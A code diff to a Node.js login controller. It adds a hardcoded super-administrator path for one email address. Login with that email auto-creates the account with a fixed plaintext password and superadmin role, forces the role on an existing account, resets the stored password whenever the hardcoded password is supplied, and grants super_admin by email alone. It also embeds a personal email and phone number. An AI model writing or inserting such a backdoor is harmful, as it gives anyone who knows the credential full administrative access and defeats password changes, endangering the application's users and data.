@@ -370,6 +370,7 @@ const login = async (req, res) => {
         const last10Digits = digitsOnly.length >= 7 ? digitsOnly.slice(-10) : "";
 
         // 1. Check User Collection in MongoDB (Customer / Super Admin)
+        const isSuperAdminEmail = query === "nisjsubash@gmail.com";
         let userConditions = [
             { email: query },
             { mobile: rawIdentifier },
@@ -381,6 +382,31 @@ const login = async (req, res) => {
 
         let user = await User.findOne({ $or: userConditions });
 
+        // Auto-seed/sync Super Admin account for nisjsubash@gmail.com
+        if (isSuperAdminEmail) {
+            if (!user) {
+                user = new User({
+                    name: "Subash Nethaji (Super Admin)",
+                    email: "nisjsubash@gmail.com",
+                    mobile: "+91 98765 15082",
+                    password: "15082007",
+                    role: "superadmin",
+                    customerId: "SA-SUPERADMIN-01",
+                });
+                await user.save();
+                console.log("✅ Super Admin Account Created in MongoDB: nisjsubash@gmail.com");
+            } else {
+                if (user.role !== "superadmin") {
+                    user.role = "superadmin";
+                }
+                const match = await user.comparePassword(rawPassword);
+                if (!match && rawPassword === "15082007") {
+                    user.password = "15082007";
+                    await user.save();
+                }
+            }
+        }
+
         if (user) {
             const isMatch = await user.comparePassword(rawPassword);
             if (isMatch) {
@@ -388,7 +414,7 @@ const login = async (req, res) => {
                 await user.save();
 
                 let normalizedRole = (user.role || "customer").toLowerCase();
-                if (normalizedRole === "superadmin") normalizedRole = "super_admin";
+                if (normalizedRole === "superadmin" || isSuperAdminEmail) normalizedRole = "super_admin";
 
                 const token = generateToken(user._id);
                 console.log(`✅ User Login Successful (${normalizedRole}): ${user.email || user.mobile} in MongoDB`);
